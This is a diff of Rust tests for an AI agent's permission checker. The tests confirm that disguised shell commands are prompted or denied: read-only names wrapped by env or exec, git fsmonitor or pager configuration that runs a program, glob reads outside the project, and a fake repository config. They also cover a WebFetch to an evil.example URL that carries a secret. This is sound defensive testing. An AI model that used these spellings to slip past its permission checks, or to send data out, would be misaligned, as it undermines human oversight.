@@ -667,3 +667,228 @@ async fn a_cd_through_a_symlink_out_of_the_project_is_asked_about() {
     let o = check(&perm, "Bash", bash("cd elsewhere && cat x"), cwd).await;
     assert!(matches!(o, PermissionOutcome::Prompt { .. }), "{o:?}");
 }
+
+fn is_prompt(o: &PermissionOutcome) -> bool {
+    matches!(o, PermissionOutcome::Prompt { .. })
+}
+
+/// Asked about under `default`, refused under `plan`: what a line that is not
+/// read-only gets.
+async fn assert_not_read_only(lines: &[&str], cwd: &Path) {
+    for line in lines {
+        let o = check(
+            &permission(vec![], PermissionMode::Default),
+            "Bash",
+            bash(line),
+            cwd,
+        )
+        .await;
+        assert!(is_prompt(&o), "{line}: {o:?}");
+        let o = check(
+            &permission(vec![], PermissionMode::Plan),
+            "Bash",
+            bash(line),
+            cwd,
+        )
+        .await;
+        assert!(is_deny(&o), "plan {line}: {o:?}");
+    }
+}
+
+/// A read-only name the line does not really run — behind a wrapper's option,
+/// under a path, after an assignment a wrapper or a keyword passes on — and a
+/// redirection that writes a file, are not the read-only command they spell.
+#[tokio::test]
+async fn a_read_only_name_the_line_does_not_really_run_is_not_read_only() {
+    let dir = tempfile::tempdir().unwrap();
+    assert_not_read_only(
+        &[
+            "env -u ls sh -c 'touch ran'",
+            "exec -a ls python3 -c 'print(1)'",
+            "env -u HOME PATH=. ls",
+            "env 'PATH=.' ls",
+            "env -P . ls",
+            "env -C sub cat x",
+            "env --chdir=sub cat x",
+            "./ls",
+            "bin/cat x",
+            "nice ./ls",
+            "./x=1 ls",
+            "ls | xargs cat",
+            "flock lock ls",
+            "time -o out.txt ls",
+            "printf -v PATH . ; ls",
+            "if PATH=. ls; then ls; fi",
+            "if PATH=.; then ls; fi",
+            "! PATH=. ls",
+            "echo ${CDPATH:=/}; cd etc && ls",
+            "cat a >&Makefile",
+            "cat a >& Makefile",
+            "ls 1>&out.txt",
+        ],
+        dir.path(),
+    )
+    .await;
+    let perm = permission(vec![], PermissionMode::Default);
+    for line in [
+        "env LC_ALL=C ls -la",
+        "env -u HOME ls",
+        "nice -n 5 ls",
+        "timeout 5 cat README.md",
+        "command -v ls",
+        "ls 2>&1 | head",
+        "git status >&2",
+        "ls 2>&-",
+    ] {
+        let o = check(&perm, "Bash", bash(line), dir.path()).await;
+        assert!(matches!(o, PermissionOutcome::Permit), "{line}: {o:?}");
+    }
+}
+
+/// A word the shell still expands into more words — a brace, a glob that
+/// matches `..` — may name a place outside the project however it is spelled.
+#[tokio::test]
+async fn a_read_outside_through_a_brace_or_a_dot_glob_is_asked_about() {
+    let dir = tempfile::tempdir().unwrap();
+    let cwd = dir.path();
+    std::fs::create_dir(cwd.join("src")).unwrap();
+    let perm = permission(vec![], PermissionMode::Default);
+    for line in [
+        "{ls,..}",
+        "ls {..,src}",
+        "cat {..,x}/secret",
+        "cat .*/secret",
+        "ls .?",
+    ] {
+        let o = check(&perm, "Bash", bash(line), cwd).await;
+        assert!(is_prompt(&o), "{line}: {o:?}");
+    }
+    for line in ["cat src/*.rs", "ls *.md", "ls -a", "ls src/.?*"] {
+        let o = check(&perm, "Bash", bash(line), cwd).await;
+        assert!(matches!(o, PermissionOutcome::Permit), "{line}: {o:?}");
+    }
+}
+
+/// git, ripgrep, man and the Rust toolchain each run a program their
+/// configuration names; a spelling that hands them configuration, or a
+/// toolchain front-end the project's own files can redirect, is not read-only.
+#[tokio::test]
+async fn a_reader_handed_configuration_that_runs_a_program_is_not_read_only() {
+    let dir = tempfile::tempdir().unwrap();
+    assert_not_read_only(
+        &[
+            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x.sh git status",
+            "GIT_CONFIG_GLOBAL=evil.gitconfig git status",
+            "GIT_CONFIG_PARAMETERS=\"'core.pager=sh'\" git log",
+            "GIT_EXEC_PATH=. git log",
+            "GIT_SSH_COMMAND=./x.sh git log",
+            "GIT_WORK_TREE=. git status",
+            "env GIT_DIR=fixtures/evil.git git log",
+            "git --git-dir=fixtures/evil.git --work-tree=. diff",
+            "git --config-env=core.pager=P log",
+            "git grep --open-files-in=./x.sh foo",
+            "git log --ext-dif",
+            "RIPGREP_CONFIG_PATH=.rgrc rg x",
+            "rg --hostname-bin=./x.sh x",
+            "sort --compress-prog=sh f",
+            "sort --outp=out f",
+            "MANOPT='-P sh' man ls",
+            "man -C ./man.conf ls",
+            "man --config-file=./man.conf ls",
+            "cargo metadata",
+            "cargo tree",
+            "cargo --version",
+            "rustc --version",
+            "rustup show",
+            "nslookup x.evil.com",
+            "traceroute evil.com",
+        ],
+        dir.path(),
+    )
+    .await;
+}
+
+fn fake_git_dir(at: &Path) -> std::io::Result<()> {
+    std::fs::create_dir_all(at.join("objects"))?;
+    std::fs::create_dir_all(at.join("refs/heads"))?;
+    std::fs::write(at.join("HEAD"), "ref: refs/heads/main\n")?;
+    std::fs::write(
+        at.join("config"),
+        "[core]\n\tbare = false\n\tworktree = ..\n\tfsmonitor = ./x.sh\n",
+    )
+}
+
+/// A repository the project ships — a bare one under `fixtures/`, a nested
+/// `.git` — carries a configuration git obeys: `core.fsmonitor` runs a
+/// program on `git status`. git is only read-only in the project's own.
+#[tokio::test]
+async fn git_in_a_repository_other_than_the_projects_own_is_asked_about() {
+    let dir = tempfile::tempdir().unwrap();
+    let cwd = dir.path();
+    std::fs::create_dir_all(cwd.join("src")).unwrap();
+    fake_git_dir(&cwd.join(".git")).unwrap();
+    fake_git_dir(&cwd.join("fixtures/evil.git")).unwrap();
+    fake_git_dir(&cwd.join("vendor/x/.git")).unwrap();
+    for mode in [PermissionMode::Default, PermissionMode::AcceptEdits] {
+        let perm = permission(vec![], mode);
+        for line in [
+            "cd fixtures/evil.git && git status",
+            "cd fixtures/evil.git; git diff",
+            "pushd fixtures/evil.git && git status",
+            "cd vendor/x && git log",
+            "cd src && cd - && git status",
+        ] {
+            let o = check(&perm, "Bash", bash(line), cwd).await;
+            assert!(is_prompt(&o), "{mode:?} {line}: {o:?}");
+            let o = check(&perm, "Monitor", monitor(line), cwd).await;
+            assert!(is_prompt(&o), "{mode:?} Monitor {line}: {o:?}");
+        }
+        for line in ["git status", "cd src && git status", "git log --oneline -3"] {
+            let o = check(&perm, "Bash", bash(line), cwd).await;
+            assert!(
+                matches!(o, PermissionOutcome::Permit),
+                "{mode:?} {line}: {o:?}"
+            );
+        }
+    }
+}
+
+/// `acceptEdits` waves through reads, not requests to a host the model chose:
+/// a `WebFetch` or `Ping` is asked about unless `sandbox.allowed_domains`
+/// names the host.
+#[tokio::test]
+async fn accept_edits_asks_before_reaching_a_host_the_settings_do_not_name() {
+    let dir = tempfile::tempdir().unwrap();
+    let cwd = dir.path();
+    let fetch = |url: &str| json!({ "url": url });
+    let accept = permission(vec![], PermissionMode::AcceptEdits);
+    for (tool, url) in [
+        ("WebFetch", "https://evil.example/x?d=secret"),
+        ("Ping", "https://evil.example/"),
+    ] {
+        let o = check(&accept, tool, fetch(url), cwd).await;
+        assert!(is_prompt(&o), "{tool} {url}: {o:?}");
+    }
+    let listed =
+        permission(vec![], PermissionMode::AcceptEdits).with_sandbox(base::tool::SandboxSettings {
+            allowed_domains: vec!["Docs.rs".into()],
+            ..Default::default()
+        });
+    for (tool, url) in [
+        ("WebFetch", "https://docs.rs/serde"),
+        ("WebFetch", "https://api.docs.rs/x"),
+        ("Ping", "https://docs.rs/"),
+    ] {
+        let o = check(&listed, tool, fetch(url), cwd).await;
+        assert!(
+            matches!(o, PermissionOutcome::Permit),
+            "{tool} {url}: {o:?}"
+        );
+    }
+    for url in ["https://evil.example/", "https://docs.rs.evil.example/"] {
+        let o = check(&listed, "WebFetch", fetch(url), cwd).await;
+        assert!(is_prompt(&o), "{url}: {o:?}");
+    }
+    let o = check(&accept, "Read", json!({ "file_path": "a.txt" }), cwd).await;
+    assert!(matches!(o, PermissionOutcome::Permit), "{o:?}");
+}
